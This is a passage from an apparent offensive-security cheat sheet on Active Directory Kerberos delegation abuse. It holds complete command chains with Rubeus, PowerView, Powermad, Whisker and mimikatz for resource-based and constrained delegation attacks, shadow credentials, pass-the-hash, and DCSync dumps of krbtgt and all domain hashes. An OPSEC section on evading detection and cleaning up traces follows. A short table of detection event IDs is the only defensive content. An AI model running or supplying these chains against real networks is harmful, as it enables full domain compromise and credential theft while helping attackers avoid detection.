New-MachineAccount -MachineAccount ATTACKER_COMP -Password $(ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force)

# Step 3 — Build and write RBCD security descriptor
$ComputerSid = Get-DomainComputer ATTACKER_COMP -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}
```

```
# Step 4 — Compute NTLM hash
Rubeus.exe hash /password:PASSWORD /user:ATTACKER_COMP$ /domain:TARGET_DOMAIN

# Step 5 — S4U chain
Rubeus.exe s4u /user:ATTACKER_COMP$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"cifs/COMPUTER_NAME.TARGET_DOMAIN" /ptt

# Step 6 — Access target
dir \\COMPUTER_NAME.TARGET_DOMAIN\C$
PsExec.exe \\COMPUTER_NAME.TARGET_DOMAIN -s cmd.exe
```

### 8.3 Chain 3 — Constrained Delegation Service Account to DCSync

**Scenario:** Compromised a service account with Constrained Delegation configured to `ldap/DC_HOSTNAME.TARGET_DOMAIN`. Goal: DCSync.

```
# Step 1 — Confirm constrained delegation target
Get-DomainUser -Identity USERNAME -Properties msds-allowedtodelegateto

# Step 2 — Request TGS for ldap on DC
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"ldap/DC_HOSTNAME.TARGET_DOMAIN" /ptt

# Step 3 — Verify ldap ticket is loaded
klist

# Step 4 — DCSync using the injected ldap ticket
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /user:krbtgt
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /user:USERNAME

# Step 5 — With full dump
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /all /csv
```

If the constrained delegation target is `host/DC_HOSTNAME.TARGET_DOMAIN` or `cifs/DC_HOSTNAME.TARGET_DOMAIN`, use altservice to get an ldap ticket:

```
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"host/DC_HOSTNAME.TARGET_DOMAIN" /altservice:ldap /ptt
```

### 8.4 Chain 4 — GenericWrite to Shadow Credentials to PTT

**Scenario:** Current user has `GenericWrite` on a high-value account (e.g., a DA). Goal: impersonate that account.

```
# Step 1 — Confirm GenericWrite on target account
Get-DomainObjectAcl -Identity DA_USER -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq (Get-DomainUser USERNAME).objectsid -and
    $_.ActiveDirectoryRights -match "GenericWrite"
}

# Step 2 — Add shadow credential
Whisker.exe add /target:DA_USER /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /path:C:\Temp\cert.pfx /password:PASSWORD

# Step 3 — Request TGT and inject
Rubeus.exe asktgt /user:DA_USER /certificate:C:\Temp\cert.pfx /password:PASSWORD /domain:TARGET_DOMAIN /dc:DC_IP /ptt

# Step 4 — Retrieve NTLM hash
Rubeus.exe asktgt /user:DA_USER /certificate:C:\Temp\cert.pfx /password:PASSWORD /domain:TARGET_DOMAIN /dc:DC_IP /getcredentials /show

# Step 5 — Use NTLM hash for PTH
mimikatz # sekurlsa::pth /user:DA_USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe

# Step 6 — Cleanup
Whisker.exe remove /target:DA_USER /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /deviceid:DEVICE_GUID
```

### 8.5 Chain 5 — RBCD on DC via WriteDACL to DCSync

**Scenario:** You have `WriteDACL` on the DC computer object. Goal: full domain compromise.

```powershell
# Step 1 — Add GenericAll to self on DC object
Add-DomainObjectAcl -TargetIdentity DC_HOSTNAME -PrincipalIdentity USERNAME -Rights All -Verbose

# Step 2 — Create attacker computer account
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount ATTACKER_COMP -Password $(ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force)

# Step 3 — Build RBCD descriptor pointing to attacker computer
$ComputerSid = Get-DomainComputer ATTACKER_COMP -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC_HOSTNAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}
```

```
# Step 4 — Compute hash of attacker computer
Rubeus.exe hash /password:PASSWORD /user:ATTACKER_COMP$ /domain:TARGET_DOMAIN

# Step 5 — S4U chain targeting DC ldap (for DCSync)
Rubeus.exe s4u /user:ATTACKER_COMP$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"ldap/DC_HOSTNAME.TARGET_DOMAIN" /ptt

# Step 6 — DCSync
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /all /csv
```

---

## 9. Detection Indicators and OPSEC Notes

### 9.1 Event IDs to be Aware Of

| Event ID | Source | Description |
|---|---|---|
| 4769 | Security | Kerberos service ticket request — look for S4U requests (RequestType = 14/15) |
| 4768 | Security | TGT request — elevated frequency from non-DC hosts |
| 4624 | Security | Logon events — type 3 from unexpected sources |
| 5136 | Directory Service | AD object modification — msDS-AllowedToActOnBehalfOfOtherIdentity changes |
| 5137 | Directory Service | AD object creation — new computer accounts |
| 4742 | Security | Computer account changed |

### 9.2 OPSEC Considerations

**For Unconstrained Delegation:**
- Prefer targeting non-DC Unconstrained systems to avoid coercion of DCs directly
- Use `/filteruser` in Rubeus monitor to reduce noise and avoid capturing irrelevant tickets
- If using coercion, SpoolSample generates Event ID 4648 (explicit credential logon) on the DC — PetitPotam via MS-EFSR may be quieter depending on defender posture

**For Constrained Delegation:**
- Use `/opsec` and AES256 (`/aes256`) with Rubeus to avoid RC4 downgrade events
- Avoid impersonating users who are marked `AccountNotDelegated` or are in Protected Users group

**For RBCD:**
- Computer account creation triggers Event 4741 — use an existing SPN-bearing account if available to avoid this
- Attribute modification (5136) on computer objects is often monitored in mature environments
- Clean up `msDS-AllowedToActOnBehalfOfOtherIdentity` immediately after use

**For Shadow Credentials:**
- Attribute modification (5136) on `msDS-KeyCredentialLink` is the primary detection point
- PKINIT authentication generates Event 4768 with `Certificate Information` populated
- Clean up added key credentials using `Whisker.exe remove` with the specific DeviceID

**General:**
- Inject tickets into sacrificial logon sessions where possible (`Rubeus.exe createnetonly /program:cmd.exe` before `/ptt`)
- Use `/nowrap` to capture base64 tickets for later injection rather than injecting immediately in noisy environments

```powershell
# Create a sacrificial logon session before ticket injection
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# Note the LUID printed, then:
Rubeus.exe ptt /ticket:BASE64_TICKET /luid:0x<LUID>
```

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
